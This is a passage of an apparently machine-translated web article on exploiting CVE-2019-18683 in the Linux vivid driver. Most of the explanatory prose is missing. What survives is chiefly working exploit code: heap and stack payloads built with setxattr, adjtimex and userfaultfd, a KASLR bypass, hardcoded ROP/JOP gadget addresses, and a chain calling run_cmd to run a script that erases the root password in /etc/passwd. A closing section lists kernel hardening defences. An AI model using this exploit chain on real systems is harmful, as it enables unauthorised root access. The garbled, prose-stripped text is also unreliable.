 [+] fault_handler for uffd 3 passed the barrier<font></font>
 [+] and now fatality: run the shell command as root!</code></pre></div></div><br>
<h2 id="anatomiya-poleznoy-nagruzki-eksployta">   </h2><br>
<p>      (,  )   .  ,    :</p><br>
<ol>
<li><code>sprayer</code>-        <code>setxattr()</code>   <code>userfaultfd()</code>;</li>
<li><code>racer</code>-        <code>adjtimex()</code>   <code>userfaultfd()</code>.      - ,           <code>copy_from_user()</code>.</li>
</ol><br>
<p>      :</p><br>
<ol>
<li> <code>vb2_buffer</code>   ,</li>
<li> <code>vb2_queue</code>   ,</li>
<li> <code>vb2_mem_ops</code>   .</li>
</ol><br>
<p>  ,    .           .   ,          <code>setxattr()</code>:</p><br>
<pre><code class="plaintext hljs">#define MMAP_SZ 0x2000<font></font>
#define PAYLOAD_SZ 504<font></font>
<font></font>
void init_heap_payload()<font></font>
{<font></font>
    struct vivid_buffer *vbuf = NULL;<font></font>
    struct vb2_plane *vplane = NULL;<font></font>
<font></font>
    for_heap = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,<font></font>
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);<font></font>
    if (for_heap == MAP_FAILED)<font></font>
        err_exit("[-] mmap");<font></font>
<font></font>
    printf(" [+] payload for_heap is mmaped to %p\n", for_heap);<font></font>
<font></font>
    /* Don't touch the second page (needed for userfaultfd) */<font></font>
    memset(for_heap, 0, PAGE_SIZE);<font></font>
<font></font>
    xattr_addr = for_heap + PAGE_SIZE - PAYLOAD_SZ;<font></font>
<font></font>
    vbuf = (struct vivid_buffer *)xattr_addr;<font></font>
<font></font>
    vbuf-&gt;vb.vb2_buf.num_planes = 1;<font></font>
    vplane = vbuf-&gt;vb.vb2_buf.planes;<font></font>
    vplane-&gt;bytesused = 16;<font></font>
    vplane-&gt;length = 16;<font></font>
    vplane-&gt;min_length = 16;<font></font>
<font></font>
    printf(" [+] vivid_buffer of size %lu is at %p\n",<font></font>
                    sizeof(struct vivid_buffer), vbuf);<font></font>
}</code></pre><br>
<p>  ,            <code>adjtimex()</code>:</p><br>
<pre><code class="plaintext hljs">#define PAYLOAD2_SZ 208<font></font>
<font></font>
void init_stack_payload()<font></font>
{<font></font>
    for_stack = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,<font></font>
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);<font></font>
    if (for_stack == MAP_FAILED)<font></font>
        err_exit("[-] mmap");<font></font>
<font></font>
    printf(" [+] payload for_stack is mmaped to %p\n", for_stack);<font></font>
<font></font>
    /* Don't touch the second page (needed for userfaultfd) */<font></font>
    memset(for_stack, 0, PAGE_SIZE);<font></font>
<font></font>
    timex_addr = for_stack + PAGE_SIZE - PAYLOAD2_SZ + 8;<font></font>
    printf(" [+] timex of size %lu is at %p\n",<font></font>
                sizeof(struct timex), timex_addr);<font></font>
}</code></pre><br>
<p>   ,     ,   ,     :</p><br>
<ul>
<li>  <code>RSP</code>,     ;</li>
<li><p>  <code>R11</code>,        .       <code>KASLR</code>,     : <br>
</p><br>
<pre><code class="plaintext hljs">#define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d<font></font>
#define KERNEL_TEXT_BASE 0xffffffff81000000<font></font>
<font></font>
kaslr_offset = strtoul(r11, NULL, 16);<font></font>
kaslr_offset -= R11_COMPONENT_TO_KASLR_OFFSET;<font></font>
if (kaslr_offset &lt; KERNEL_TEXT_BASE) {<font></font>
    printf("bad kernel text base 0x%lx\n", kaslr_offset);<font></font>
    err_exit("[-] kmsg parsing for r11");<font></font>
}<font></font>
kaslr_offset -= KERNEL_TEXT_BASE;</code></pre><br>
</li>
</ul><br>
<p> ,  <code>kmsg</code>,          .       .           ( ).</p><br>
<pre><code class="plaintext hljs">#define TIMEX_STACK_OFFSET 0x1d0<font></font>
<font></font>
#define LIST_OFFSET 24<font></font>
#define OPS_OFFSET 64<font></font>
#define CMD_OFFSET 172<font></font>
<font></font>
struct vivid_buffer *vbuf = (struct vivid_buffer *)xattr_addr;<font></font>
struct vb2_queue *vq = NULL;<font></font>
struct vb2_mem_ops *memops = NULL;<font></font>
struct vb2_plane *vplane = NULL;<font></font>
<font></font>
printf("Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:\n",<font></font>
       kstack,<font></font>
       kaslr_offset);<font></font>
<font></font>
/* point to future position of vb2_queue in timex payload on kernel stack */<font></font>
vbuf-&gt;vb.vb2_buf.vb2_queue = (struct vb2_queue *)(kstack - TIMEX_STACK_OFFSET);<font></font>
vq = (struct vb2_queue *)timex_addr;<font></font>
printf(" vb2_queue of size %lu will be at %p, userspace %p\n",<font></font>
       sizeof(struct vb2_queue),<font></font>
       vbuf-&gt;vb.vb2_buf.vb2_queue,<font></font>
       vq);<font></font>
<font></font>
/* just to survive vivid list operations */<font></font>
vbuf-&gt;list.next = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET);<font></font>
vbuf-&gt;list.prev = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET);<font></font>
<font></font>
/*<font></font>
 * point to future position of vb2_mem_ops in timex payload on kernel stack;<font></font>
 * mem_ops offset is 0x38, be careful with OPS_OFFSET<font></font>
 */<font></font>
vq-&gt;mem_ops = (struct vb2_mem_ops *)(kstack - TIMEX_STACK_OFFSET + OPS_OFFSET);<font></font>
printf(" mem_ops ptr will be at %p, userspace %p, value %p\n",<font></font>
       &amp;(vbuf-&gt;vb.vb2_buf.vb2_queue-&gt;mem_ops),<font></font>
       &amp;(vq-&gt;mem_ops),<font></font>
       vq-&gt;mem_ops);<font></font>
<font></font>
memops = (struct vb2_mem_ops *)(timex_addr + OPS_OFFSET);<font></font>
<font></font>
/* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */<font></font>
memops-&gt;vaddr = (void *)ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET<font></font>
                                                          + kaslr_offset;<font></font>
printf(" mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p\n",<font></font>
       sizeof(struct vb2_mem_ops),<font></font>
       vq-&gt;mem_ops,<font></font>
       memops,<font></font>
       memops-&gt;vaddr,<font></font>
       &amp;(memops-&gt;vaddr));</code></pre><br>
<p>   ,            .<br>
<img src="https://habrastorage.org/getpro/habr/post_images/7d0/4ca/d2f/7d04cad2f760d5c442e11752ab98dd66.png" alt="ペイロードの解剖学"></p><br>
<h2 id="ropnjop">ROP'n'JOP</h2><br>
<p>    ROP- (Return-Oriented Programming),            .</p><br>
<p>   ROP-,         (stack-pivoting gadget)         <code>void *(*vaddr)(void *buf_priv)</code>,     .    <code>buf_priv</code>   <code>vb2_plane.mem_priv</code>,    .   Linux   <code>x86_64</code>       <code>RDI</code>.     <code>push rdi; pop rsp</code>       ,      ,       <code>SMAP</code>  <code>SMEP</code>.</p><br>
<p>   ROP-     .   ,          :</p><br>
<pre><code class="plaintext hljs">#define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1<font></font>
#define ROP__POP_R15__RET 0xffffffff81084ecf<font></font>
#define ROP__POP_RDI__RET 0xffffffff8101ef05<font></font>
#define ROP__JMP_R15 0xffffffff81c071be<font></font>
#define ADDR_RUN_CMD 0xffffffff810b4ed0<font></font>
#define ADDR_DO_TASK_DEAD 0xffffffff810bf260<font></font>
<font></font>
unsigned long *rop = NULL;<font></font>
char *cmd = "/bin/sh /home/a13x/pwn"; /* rewrites /etc/passwd dropping root pwd */<font></font>
size_t cmdlen = strlen(cmd) + 1; /* for 0 byte */<font></font>
<font></font>
/* mem_priv is the arg for vaddr() */<font></font>
vplane = vbuf-&gt;vb.vb2_buf.planes;<font></font>
vplane-&gt;mem_priv = (void *)(kstack - TIMEX_STACK_OFFSET + ROP_CHAIN_OFFSET);<font></font>
<font></font>
rop = (unsigned long *)(timex_addr + ROP_CHAIN_OFFSET);<font></font>
printf("   rop chain will be at %p, userspace %p\n", vplane-&gt;mem_priv, rop);<font></font>
<font></font>
strncpy((char *)timex_addr + CMD_OFFSET, cmd, cmdlen);<font></font>
printf("   cmd will be at %lx, userspace %p\n",<font></font>
       (kstack - TIMEX_STACK_OFFSET + CMD_OFFSET),<font></font>
       (char *)timex_addr + CMD_OFFSET);<font></font>
<font></font>
/* stack will be trashed near rop chain, be careful with CMD_OFFSET */<font></font>
*rop++ = 0x1337133713371337; /* placeholder for pop rbp in the pivoting gadget */<font></font>
*rop++ = ROP__POP_R15__RET + kaslr_offset;<font></font>
*rop++ = ADDR_RUN_CMD + kaslr_offset;<font></font>
*rop++ = ROP__POP_RDI__RET + kaslr_offset;<font></font>
*rop++ = (unsigned long)(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET);<font></font>
*rop++ = ROP__JMP_R15 + kaslr_offset;<font></font>
*rop++ = ROP__POP_R15__RET + kaslr_offset;<font></font>
*rop++ = ADDR_DO_TASK_DEAD + kaslr_offset;<font></font>
*rop++ = ROP__JMP_R15 + kaslr_offset;<font></font>
<font></font>
printf(" [+] the payload for kernel heap and stack is ready. Put it.\n");</code></pre><br>
<p>  ROP-     <code>run_cmd()</code>  <code>kernel/reboot.c</code>   <code>R15</code>.    <code>RDI</code>     shell-,      .   <code>RDI</code>      <code>run_cmd()</code>   .   ROP-   JOP- (Jump-Oriented Programming).    <code>run_cmd()</code>,    <code>'/bin/sh /home/a13x/pwn'</code>   root.    <code>/etc/passwd</code>,         root:</p><br>
<pre><code class="plaintext hljs">#!/bin/sh<font></font>
# drop root password<font></font>
sed -i '1s/.*/root::0:0:root:\/root:\/bin\/bash/' /etc/passwd</code></pre><br>
<p>  ROP-      <code>__noreturn do_task_dead()</code>  <code>kernel/exit.c</code>.          (   system fixating).   ,      ,      .</p><br>
<h2 id="vozmozhnye-sredstva-zaschity">  </h2><br>
<p>  Linux    ,        .</p><br>
<ol>
<li>  <code>0</code>   <code>/proc/sys/vm/unprivileged_userfaultfd</code>          .       ( <code>SYS_CAP_PTRACE</code>)   <code>userfaultfd()</code>.</li>
<li>  <code>1</code>  sysctl <code>kernel.dmesg_restrict</code>        .        <code>dmesg</code>.   ,   <code>kernel.dmesg_restrict = 1</code>  Ubuntu,    <code>adm</code>,        <code>/var/log/syslog</code>.</li>
<li>  <strong>grsecurity/PaX</strong>   Linux    <code>PAX_RANDKSTACK</code>,        <code>vb2_queue</code>:<br>
<br>
<pre><code class="plaintext hljs">+config PAX_RANDKSTACK<font></font>
+ bool "Randomize kernel stack base"<font></font>
+ default y if GRKERNSEC_CONFIG_AUTO &amp;&amp; !(GRKERNSEC_CONFIG_VIRT_HOST &amp;&amp; GRKERNSEC_CONFIG_VIRT_VIRTUALBOX)<font></font>
+ depends on X86_TSC &amp;&amp; X86<font></font>
+ help<font></font>
+   By saying Y here the kernel will randomize every task's kernel<font></font>
+   stack on every system call.  This will not only force an attacker<font></font>
+   to guess it but also prevent him from making use of possible<font></font>
+   leaked information about it.<font></font>
+<font></font>
+   Since the kernel stack is a rather scarce resource, randomization<font></font>
+   may cause unexpected stack overflows, therefore you should very<font></font>
+   carefully test your system.  Note that once enabled in the kernel<font></font>
+   configuration, this feature cannot be disabled on a per file basis.<font></font>
+</code></pre></li>
<li> <code>PAX_RAP</code>   <strong>grsecurity/PaX</strong>   Linux       ROP/JOP-.</li>
<li>,      Linux      <strong>ARM Memory Tagging Extension (MTE)</strong>. ,         «  » (use-after-free).</li>
</ol><br>
<p>      <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">grsecurity/PaX</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">ARM MTE</a>.</p><br>
<h2 id="zaklyuchenie"></h2><br>
<p>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">CVE-2019-18683</a>,            . ,  .</p><br>
<p>   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Positive Technologies</a>      .</p></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja491744/index.html">イランのハッカーがVPNの脆弱性を悪用</a></li>
<li><a href="../ja491746/index.html">音声合成の歴史：電気的ソリューションの時代</a></li>
<li><a href="../ja491748/index.html">視覚障害者が英語を学ぶのを助ける技術</a></li>
<li><a href="../ja491750/index.html">教科書よりも部分文字列検索を書く</a></li>
<li><a href="../ja491754/index.html">KOMPAS-3D v18ホーム。3Dプリント用のミニコースデザイン。モデリングの基本からトップダウン3D設計まで</a></li>
<li><a href="../ja491760/index.html">Telegram。200行のコードのタクシー</a></li>
<li><a href="../ja491764/index.html">暗い宇宙。パート1</a></li>
<li><a href="../ja491766/index.html">C ++での関数と論理演算子の組み合わせ</a></li>
<li><a href="../ja491770/index.html">アマチュア向けドローン：デバイスとプログラミングの原則</a></li>
<li><a href="../ja491774/index.html">Zabbix、Ansible、およびNapalmでCiscoスイッチポートのロックを解除</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>